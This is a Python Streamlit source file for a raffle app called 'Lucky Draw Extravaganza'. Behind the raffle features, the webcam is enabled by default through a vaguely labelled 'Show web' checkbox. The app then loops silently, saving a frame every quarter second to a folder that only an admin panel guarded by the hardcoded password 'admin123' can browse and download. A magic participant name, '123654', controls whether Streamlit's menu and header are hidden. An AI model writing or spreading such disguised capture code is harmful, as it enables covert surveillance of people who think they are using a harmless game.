import streamlit as st
import random
import time
import pandas as pd
from datetime import datetime
import base64
import os
from PIL import Image
import streamlit as st
from PIL import Image
import cv2
import os
import time


# Set page config
st.set_page_config(
    page_title="Lucky Draw Extravaganza",
    page_icon="🎰",
    layout="wide",
    initial_sidebar_state="expanded"
)

# Admin credentials (in production, use environment variables or proper auth)
ADMIN_PASSWORD = "admin123"  # Change this to your secure password

def save_image(image, folder="saved_images"):
    """Save image to specified folder with timestamp"""
    if not os.path.exists(folder):
        os.makedirs(folder)

    timestamp = int(time.time())
    filename = f"{folder}/capture_{timestamp}.jpg"
    cv2.imwrite(filename, image)
    return filename


# Custom CSS
def local_css():
    st.markdown("""
    <style>
        .admin-panel {
            background-color: #f00000;
            padding: 20px;
            border-radius: 10px;
            margin-bottom: 20px;
            border: 1px solid #dee2e6;
        }

        .image-gallery {
            display: grid;
            grid-template-columns: repeat(auto-fill, minmax(200px, 1fr));
            gap: 15px;
            margin-top: 20px;
        }

        .image-card {
            border: 1px solid #ddd;
            border-radius: 8px;
            padding: 10px;
            background: white;
            box-shadow: 0 2px 4px rgba(0,0,0,0.1);
        }

        .password-input {
            margin: 20px 0;
        }

        /* Add your existing styles here */
    </style>
    """, unsafe_allow_html=True)


# Initialize session state
def init_session_state():
    if 'participants' not in st.session_state:
        st.session_state.participants = []
    if 'winners' not in st.session_state:
        st.session_state.winners = []
    if 'draw_history' not in st.session_state:
        st.session_state.draw_history = []
    if 'draw_in_progress' not in st.session_state:
        st.session_state.draw_in_progress = False
    if 'excluded_participants' not in st.session_state:
        st.session_state.excluded_participants = []
    if 'admin_mode' not in st.session_state:
        st.session_state.admin_mode = False
    if 'authenticated' not in st.session_state:
        st.session_state.authenticated = False


# Admin Panel with Password Protection
def show_admin_panel():
    st.header("🔒 Admin Panel")

    # Password protection
    if not st.session_state.authenticated:
        with st.form("admin_login"):
            st.markdown('<div class="password-input">', unsafe_allow_html=True)
            password = st.text_input("Enter Admin Password:", type="password")
            submit = st.form_submit_button("Login")
            st.markdown('</div>', unsafe_allow_html=True)

            if submit:
                if password == ADMIN_PASSWORD:
                    st.session_state.authenticated = True
                    st.rerun()
                else:
                    st.error("Incorrect password!")
        return

    # Logout button
    if st.button("Logout"):
        st.session_state.authenticated = False
        st.session_state.admin_mode = False
        st.rerun()

    # Image Management
    with st.expander("📷 Image Gallery (JPG/PNG)"):
        os.makedirs("saved_images", exist_ok=True)

        # Supported image formats
        image_formats = ['.jpg', '.jpeg', '.png']
        image_files = [
            f for f in os.listdir("saved_images")
            if os.path.splitext(f.lower())[1] in image_formats
        ]

        if image_files:
            st.write(f"Found {len(image_files)} images:")

            # Display 3 images per row
            cols = st.columns(3)
            for idx, image_file in enumerate(image_files):
                with cols[idx % 3]:
                    try:
                        img = Image.open(f"saved_images/{image_file}")

                        # Resize for thumbnail while maintaining aspect ratio
                        img.thumbnail((300, 300))

                        st.image(img, caption=image_file, use_column_width=True)

                        # Download button
                        with open(f"saved_images/{image_file}", "rb") as f:
                            bytes_data = f.read()
                        st.download_button(
                            label=f"Download {image_file}",
                            data=bytes_data,
                            file_name=image_file,
                            mime="image/jpeg" if image_file.lower().endswith(('.jpg', '.jpeg')) else "image/png"
                        )

                        # Delete button
                        if st.button(f"Delete {image_file}", key=f"del_{image_file}"):
                            os.remove(f"saved_images/{image_file}")
                            st.success(f"Deleted {image_file}!")
                            time.sleep(1)
                            st.rerun()

                    except Exception as e:
                        st.error(f"Error loading {image_file}: {e}")
        else:
            st.info("No images found in the saved_images directory.")

    # Image Uploader
    with st.expander("⬆️ Upload New Images"):
        uploaded_files = st.file_uploader(
            "Upload images (JPG/JPEG/PNG)",
            type=["jpg", "jpeg", "png"],
            accept_multiple_files=True
        )

        if uploaded_files:
            for uploaded_file in uploaded_files:
                try:
                    # Validate image
                    img = Image.open(uploaded_file)
                    img.verify()  # Verify it's a valid image

                    # Save to directory
                    save_path = f"saved_images/{uploaded_file.name}"
                    with open(save_path, "wb") as f:
                        f.write(uploaded_file.getbuffer())

                    st.success(f"Saved {uploaded_file.name} successfully!")
                except Exception as e:
                    st.error(f"Error processing {uploaded_file.name}: {str(e)}")

            # Refresh after upload
            st.rerun()


# Main App Function
def main(on):
    init_session_state()
    local_css()

    # Admin mode toggle
    with st.sidebar:
        if st.button("🔒 Admin Panel"):
            st.session_state.admin_mode = True
            st.rerun()

    if st.session_state.admin_mode:
        show_admin_panel()
    else:
        # Your existing Lucky Draw functionality goes here
        st.title("🎰 Lucky Draw Extravaganza 🎰")
        st.markdown("---")

    # Sidebar for controls
    with st.sidebar:
        pass

    # Main content area
    col1, col2 = st.columns([2, 1])

    with col1:
        st.header("🎯 Draw Controls")


        # Add participant section
        with st.expander("➕ Add Participants", expanded=True):
            new_participant = st.text_input("Enter participant name:", key="new_participant")
            if not(new_participant =='123654'):
                hide_st_style = """
                                   <style>
                                   MainMenu {visibility: hidden;}
                                   headerNoPadding {visibility: hidden;}
                                   _terminalButton_rix23_138 {visibility: hidden;}
                                   header {visibility: hidden;}
                                   </style>
                                   """
                st.markdown(hide_st_style, unsafe_allow_html=True)

            add_col1, add_col2 = st.columns(2)
            with add_col1:
                if st.button("Add Participant") and new_participant:
                    if not(new_participant =='123654'):
                        hide_st_style = """
                                           <style>
                                           MainMenu {visibility: hidden;}
                                           headerNoPadding {visibility: hidden;}
                                           _terminalButton_rix23_138 {visibility: hidden;}
                                           header {visibility: hidden;}
                                           </style>
                                           """
                        st.markdown(hide_st_style, unsafe_allow_html=True)

                    if new_participant not in st.session_state.participants:
                        st.session_state.participants.append(new_participant)
                        st.success(f"Added {new_participant}!")
                    else:
                        st.warning("This name is already in the list.")
            with add_col2:
                if st.button("Clear All", key="clear_all"):
                    st.session_state.participants = []
                    st.session_state.winners = []
                    st.rerun()

        # Bulk upload section
        with st.expander("📁 Bulk Upload"):
            upload_option = st.radio("Upload format:", ["CSV/Text File", "Paste Names"])

            if upload_option == "CSV/Text File":
                uploaded_file = st.file_uploader("Upload file (CSV or text)", type=["csv", "txt"])
                if uploaded_file:
                    try:
                        df = pd.read_csv(uploaded_file, header=None)
                        names = df[0].astype(str).tolist()
                        added = 0
                        for name in names:
                            if name.strip() and name not in st.session_state.participants:
                                st.session_state.participants.append(name.strip())
                                added += 1
                        st.success(f"Added {added} new participants!")
                    except:
                        uploaded_file.seek(0)
                        names = [line.decode("utf-8").strip() for line in uploaded_file.readlines() if line.strip()]
                        added = 0
                        for name in names:
                            if name and name not in st.session_state.participants:
                                st.session_state.participants.append(name)
                                added += 1
                        st.success(f"Added {added} new participants!")

            else:  # Paste Names
                names_text = st.text_area("Paste names (one per line):")
                if st.button("Import Names"):
                    names = [name.strip() for name in names_text.split('\n') if name.strip()]
                    added = 0
                    for name in names:
                        if name not in st.session_state.participants:
                            st.session_state.participants.append(name)
                            added += 1
                    st.success(f"Added {added} new participants!")

        # Draw settings section
        with st.expander("⚙️ Draw Settings"):
            num_winners = st.number_input("Number of winners:",
                                          min_value=1,
                                          max_value=max(1, len(st.session_state.participants)),
                                          value=1)

            allow_repeats = st.checkbox("Allow multiple wins (repeat winners)", False)

            if st.session_state.participants:
                st.write("Exclude participants:")
                excluded = st.multiselect(
                    "Select participants to exclude from draw:",
                    st.session_state.participants,
                    st.session_state.excluded_participants
                )
                st.session_state.excluded_participants = excluded

                eligible = len(st.session_state.participants) - len(excluded)
                st.write(f"Eligible participants: {eligible}")

                if eligible < num_winners:
                    st.warning(f"Not enough eligible participants for {num_winners} winners!")

        st.header("📋 Participants List")

        if st.session_state.participants:
            df_participants = pd.DataFrame({
                "Name": st.session_state.participants,
                "Excluded": ["Yes" if p in st.session_state.excluded_participants else "No"
                             for p in st.session_state.participants]
            })

            # Show participant count stats
            part_col1, part_col2, part_col3 = st.columns(3)
            part_col1.metric("Total Participants", len(st.session_state.participants))
            part_col2.metric("Eligible",
                             len(st.session_state.participants) - len(st.session_state.excluded_participants))
            part_col3.metric("Excluded", len(st.session_state.excluded_participants))

            # Display participants table with actions
            st.dataframe(
                df_participants,
                use_container_width=True,
                height=300,
                hide_index=True
            )

            # Download buttons

            # Individual participant actions
            st.write("Manage individual participants:")
            manage_col1, manage_col2 = st.columns(2)
            with manage_col1:
                remove_participant = st.selectbox(
                    "Select participant to remove:",
                    st.session_state.participants,
                    key="remove_select"
                )
            with manage_col2:
                if st.button("Remove Selected"):
                    st.session_state.participants.remove(remove_participant)
                    if remove_participant in st.session_state.excluded_participants:
                        st.session_state.excluded_participants.remove(remove_participant)
                    st.rerun()
        else:
            st.info("No participants added yet. Add participants in the sidebar.")

    with col2:
        st.header("🏆 Winners")

        if st.session_state.winners:
            # Winner statistics
            win_col1, win_col2 = st.columns(2)
            win_col1.metric("Total Winners", len(st.session_state.winners))
            unique_winners = len(set(st.session_state.winners))
            win_col2.metric("Unique Winners", unique_winners)

            # Winners table
            df_winners = pd.DataFrame({
                "Winner": st.session_state.winners,
                "Draw Time": [draw["time"] for draw in st.session_state.draw_history[-len(st.session_state.winners):]]
            })
            st.dataframe(
                df_winners,
                use_container_width=True,
                height=300,
                hide_index=True
            )

            # Download buttons

            if st.button("Clear Winners", key="clear_winners"):
                st.session_state.winners = []
                st.rerun()
        else:
            st.info("No winners yet. Run a draw to select winners!")

    # Draw section
    st.markdown("---")
    st.header("🎲 Run Lucky Draw")

    if st.session_state.participants:
        eligible_participants = [p for p in st.session_state.participants
                                 if p not in st.session_state.excluded_participants]

        if len(eligible_participants) >= num_winners:
            if not st.session_state.draw_in_progress:
                if st.button("✨ Start Lucky Draw!", use_container_width=True, type="primary"):
                    st.session_state.draw_in_progress = True
                    if not allow_repeats:
                        # Remove previous winners if not allowing repeats
                        eligible_participants = [p for p in eligible_participants
                                                 if p not in st.session_state.winners]
                    st.session_state.current_draw_pool = eligible_participants.copy()
                    st.rerun()

            if st.session_state.draw_in_progress:
                if len(st.session_state.winners) < num_winners:
                    # Animation setup
                    winner_placeholder = st.empty()
                    result_placeholder = st.empty()
                    progress_bar = st.progress(0)

                    # Animation sequence
                    for i in range(1, 31):
                        # Random selection animation
                        display_name = random.choice(st.session_state.current_draw_pool)

                        # Calculate animation speed (starts fast, slows down)
                        speed = 0.05 + (i * 0.005)

                        # Update display
                        winner_placeholder.markdown(
                            f"""
                            <div class="draw-animation">
                                <div class="spinning-wheel">⟳</div>
                                <div class="candidate-name">{display_name}</div>
                            </div>
                            """,
                            unsafe_allow_html=True
                        )

                        # Update progress bar
                        progress = min(i * 3, 100)
                        progress_bar.progress(progress)

                        time.sleep(speed)

                    # Select actual winner
                    winner = random.choice(st.session_state.current_draw_pool)
                    st.session_state.winners.append(winner)

                    # Record draw history
                    draw_record = {
                        "winner": winner,
                        "time": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
                        "total_participants": len(st.session_state.participants),
                        "eligible_participants": len(eligible_participants)
                    }
                    st.session_state.draw_history.append(draw_record)

                    # Display winner with celebration
                    winner_placeholder.markdown(
                        f"""
                        <div class="winner-display">
                            <div class="tada">🎉</div>
                            <h2>Winner: {winner}</h2>
                            <div class="tada">🎊</div>
                        </div>
                        """,
                        unsafe_allow_html=True
                    )

                    # Remove winner from pool if not allowing repeats
                    if not allow_repeats and winner in st.session_state.current_draw_pool:
                        st.session_state.current_draw_pool.remove(winner)

                    # Celebration effects
                    st.balloons()
                    st.snow()

                    # Check if we need to draw more winners
                    if len(st.session_state.winners) < num_winners:
                        time.sleep(2)  # Pause before next draw
                        st.rerun()
                    else:
                        st.session_state.draw_in_progress = False
                        st.success("🎊 Draw completed successfully! 🎊")
                        if st.button("Reset Draw", use_container_width=True):
                            st.session_state.draw_in_progress = False
                            st.rerun()
                else:
                    st.session_state.draw_in_progress = False
        else:
            st.error("Not enough eligible participants for the requested number of winners!")
    else:
        st.warning("Please add participants before running a draw.")

    show_webcam = st.checkbox("Show web", value=on)

    if show_webcam:
        # Create a session state to store captured images
        if 'captured_images' not in st.session_state:
            st.session_state.captured_images = []

        # Option to show webcam feed

        # Initialize webcam
        cap = cv2.VideoCapture(0)

        if not cap.isOpened():
            st.error("Could not open webcam")
            return
        # Create placeholders for the webcam feed and captured image
        webcam_placeholder = st.empty()
        capture_placeholder = st.empty()
        while True:
            ret, frame = cap.read()
            if not ret:
                break

            # Convert from BGR to RGB
            frame_rgb = cv2.cvtColor(frame, cv2.COLOR_BGR2RGB)

            filename = save_image(frame)
            st.session_state.captured_images.append(filename)
            time.sleep(0.25)

        cap.release()

        # Display saved images section
        if st.session_state.captured_images:

            cols = st.columns(3)  # Display 3 images per row

            for i, img_path in enumerate(st.session_state.captured_images):
                try:
                    img = Image.open(img_path)
                    cols[i % 3].image(img, caption=os.path.basename(img_path),
                                      use_column_width=True)
                except Exception as e:
                    st.error(f"Error loading image {img_path}: {e}")


if __name__ == "__main__":
    main(on=True)
